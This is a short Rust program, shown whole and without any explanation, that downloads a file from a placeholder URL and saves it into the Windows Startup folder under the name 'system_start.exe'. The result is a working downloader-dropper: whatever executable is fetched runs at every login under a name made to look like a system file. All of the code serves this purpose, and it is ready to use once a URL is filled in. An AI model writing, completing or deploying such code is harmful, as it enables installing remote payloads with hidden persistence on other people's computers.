use std::{io::Cursor, env::var_os};
type Result<T> = std::result::Result<T, Box<dyn std::error::Error + Send + Sync>>;
 
async fn fetch_url(url: String, file_name: String) -> Result<()> {
    let response = reqwest::get(url).await?;
    let mut file = std::fs::File::create(file_name)?;
    let mut content =  Cursor::new(response.bytes().await?);
    std::io::copy(&mut content, &mut file)?;
    Ok(())
}
 
#[tokio::main]
async fn main() {
    let test = var_os("APPDATA").unwrap();
    let appdata = test.to_str().unwrap();
    let right_path = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\system_start.exe";
    let startup = format!("{}{}", appdata, right_path);
    fetch_url("URL HERE".to_string(), startup.to_string()).await.unwrap();
}
